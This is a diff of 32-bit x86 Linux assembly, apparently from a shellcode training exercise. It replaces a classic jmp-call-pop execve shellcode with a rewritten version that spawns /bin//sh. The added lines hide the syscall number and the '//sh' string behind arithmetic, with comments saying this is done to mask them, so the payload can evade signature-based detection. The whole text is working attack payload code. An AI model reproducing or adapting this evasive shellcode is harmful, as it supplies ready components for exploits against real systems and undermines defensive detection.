@@ -8,30 +8,21 @@ global _start
 section .text
 
 _start:
-	jmp short 0x1a
-	pop esi
-	xor eax,eax
-	mov [esi+0x9],al
-	mov [esi+0xa],esi
-	mov [esi+0xe],eax
-	mov al,0xb
-	mov ebx,esi
-	lea ecx,[esi+0xa]
-	lea edx,[esi+0xe]
+	xor ecx,ecx
+	mul ecx
+	
+	; mov al,0xb
+	push 0xb		; attempt to mask the syscall number
+	pop eax
+	
+	push ecx
+	
+	; push dword 0x68732f2f
+	mov esi, 0x16cfdd8c	; hide the //sh
+	add esi, 0x51a351a3
+	push esi
+	
+	push dword 0x6e69622f
+	
+	mov ebx,esp
 	int 0x80
-	call 0x2
-	das
-	bound ebp,[ecx+0x6e]
-	das
-	fs popa
-	jnc 0x90
-	inc ecx
-	inc edx
-	inc edx
-	inc edx
-	inc edx
-	inc ebx
-	inc ebx
-	inc ebx
-	inc ebx
-
